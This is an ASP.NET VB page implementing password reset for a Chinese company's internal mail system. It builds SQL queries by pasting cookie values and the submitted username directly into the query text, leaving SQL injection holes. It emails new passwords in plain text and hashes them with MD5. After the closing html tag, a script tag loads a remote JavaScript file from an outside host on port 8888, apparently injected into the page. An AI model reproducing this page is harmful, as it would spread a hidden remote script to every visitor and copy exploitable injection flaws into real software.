<%@ Page Language="VB" %>
<%@ Register Assembly="System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    Namespace="System.Web.UI" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    Dim dbconn As New dbconn
    Dim conn As Data.OleDb.OleDbConnection
    Dim cmd As Data.OleDb.OleDbCommand
    Dim FunctionClass As New FunctionClass
    Dim dr As Data.OleDb.OleDbDataReader
    Dim VNum As String
    Protected Sub Page_Init(ByVal sender As Object, ByVal e As System.EventArgs)
        dbconn.Create()
        conn = dbconn.GetConn()
        cmd = conn.CreateCommand
        Dim username As String
        Dim rndtext As String
        If Request.Cookies("nbmailsystem") Is Nothing Then
            Exit Sub
        End If
        If Request.Cookies("nbmailsystem")("username") Is Nothing Or Request.Cookies("nbmailsystem")("rndtext") Is Nothing Then
            Response.Redirect("index.aspx")
        End If
        username = Trim(Request.Cookies("nbmailsystem")("username").ToString())
        rndtext = Trim(Request.Cookies("nbmailsystem")("rndtext").ToString())
        cmd.CommandText = "select count(*) as count001 from [userinfo] where [username]='" & username & "' and [rndtext]='" & rndtext & "'"
        dr = cmd.ExecuteReader()
        dr.Read()
        If dr("count001") <= 0 Then
            dr.Close()
            Response.Redirect("index.aspx")
        End If
        dr.Close()
    End Sub
    Protected Sub Page_Unload(ByVal sender As Object, ByVal e As System.EventArgs)
        If (conn Is Nothing) = False Then
            dbconn.Close()
            conn = Nothing
            dbconn = Nothing
            cmd = Nothing
        End If
    End Sub
    Protected Sub Timer_timemsg_Tick(ByVal sender As Object, ByVal e As System.EventArgs)
        Dim tempmsg As String
        Select Case Now.Hour
            Case 0 To 4
                tempmsg = "凌晨好！"
            Case 5 To 7
                tempmsg = "早上好！"
            Case 8 To 11
                tempmsg = "上午好！"
            Case 12
                tempmsg = "中午好！"
            Case 13 To 17
                tempmsg = "下午好！"
            Case 18 To 23
                tempmsg = "晚上好！"
        End Select
        Label_timemsg.Text = "现在是" + CStr(Now.Date.Year) + "年" + Right("0" + CStr(Now.Month), 2) + "月" + Right("0" + CStr(Now.Day), 2) + "日" + " " + Right("0" + CStr(Now.Hour), 2) + "时" + Right("0" + CStr(Now.Minute), 2) + "分" + Right("0" + CStr(Now.Second), 2) + "秒 " + tempmsg
    End Sub
    Protected Sub Button_reset_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        Dim password As String
        Dim email As String
        Text_username.Text = Trim(Text_username.Text)
        If Trim(Text_verifychar.Text) = "" Then
            MsgBox("验证码为空！", 4096, "错误")
            Exit Sub
        End If
        If LCase(VNum) <> LCase(Trim(Text_verifychar.Text)) Then
            MsgBox("验证码错误！", 4096, "错误")
            Exit Sub
        End If
        If FunctionClass.IsTrue(Text_username.Text) = False Then
            FunctionClass.DisplayErr(weberr.sqlerr)
        End If
        cmd.CommandText = "select * from userinfo where username='" + Text_username.Text + "'"
        dr = cmd.ExecuteReader()
        If dr.HasRows() = False Then
            dr.Close()
            MsgBox("用户不存在！", 4096, "错误")
            Exit Sub
        End If
        dr.Read()
        email = dr("e-mail")
        password = FunctionClass.Getrndtext(10)
        dr.Close()
        cmd.CommandText = "update [userinfo] set [password]='" + FunctionClass.MD5String(password) + "' where [username]='" + Text_username.Text + "'"
        If cmd.ExecuteNonQuery() <= 0 Then
            FunctionClass.DisplayErr(weberr.accessdberr)
        End If
        FunctionClass.sendmail(email, "找回密码", "用户名：" + Text_username.Text + Chr(13) + Chr(15) + "新密码：" + password)
        MsgBox("新密码已发送到注册邮箱中，请注意查收！", 4096, "提示")
    End Sub
    Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs)
        ImageButton_verifychar.ImageUrl = "verifychar.aspx"
        VNum = Session(FunctionClass.GetIP() + "VNum")
    End Sub

    Protected Sub ImageButton_verifychar_Click(ByVal sender As Object, ByVal e As System.Web.UI.ImageClickEventArgs)
        ImageButton_verifychar.ImageUrl = "verifychar.aspx"
        VNum = Session(FunctionClass.GetIP() + "VNum")
    End Sub
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<link rel="stylesheet" href="Style.css" type="text/css" />
<link rel="shortcut icon" href="logo.ico" type="image/x-icon" /> 
    <title>
    <% 
        cmd.CommandText = "select * from WebInfo"
        dr = cmd.ExecuteReader()
        If dr.HasRows() = True Then
            dr.Read()
            Response.Write(dr("comname") + "内部邮件系统-忘记密码")
        End If
        dr.Close()
     %>
    </title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:scriptmanager ID="Scriptmanager1" runat="server">
        </asp:scriptmanager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" UpdateMode="Conditional">
        <ContentTemplate> 
        <asp:Timer ID="Timer_timemsg" runat="server" Interval ="1" OnTick="Timer_timemsg_Tick" /> 
        <asp:Label ID="Label_timemsg" runat="server" Text="Label" Width="744px" />
        </ContentTemplate>
        </asp:UpdatePanel>
        <% 
            cmd.CommandText = "select * from WebInfo"
            dr = cmd.ExecuteReader()
            If dr.HasRows() = True Then
                dr.Read()
                Response.Write("<br /><br /><center><img src=logo.jpg><font color=#FFFFFF size=12px>" + dr("comname") + "内部邮件系统欢迎您！</font></center><br /><br />")
            End If
            dr.Close()
        %>
        </div>  
        <center>
        <asp:Label ID="Label1" runat="server" Text="用户名："></asp:Label>
        <asp:TextBox ID="Text_username" runat="server"></asp:TextBox>
        <br />
        <br />
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<asp:Label ID="Label2" runat="server" Text="验证码："></asp:Label>
        <asp:TextBox ID="Text_verifychar" runat="server"></asp:TextBox>
        <asp:ImageButton ID="ImageButton_verifychar" runat="server" Height="20px" Width="41px" OnClick="ImageButton_verifychar_Click" />&nbsp;</center> 
        <center>
            <br />
        <asp:Button ID="Button_reset" runat="server" Text="重置密码" OnClick="Button_reset_Click" />
        </center>
    </form>
</body>
</html>
<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>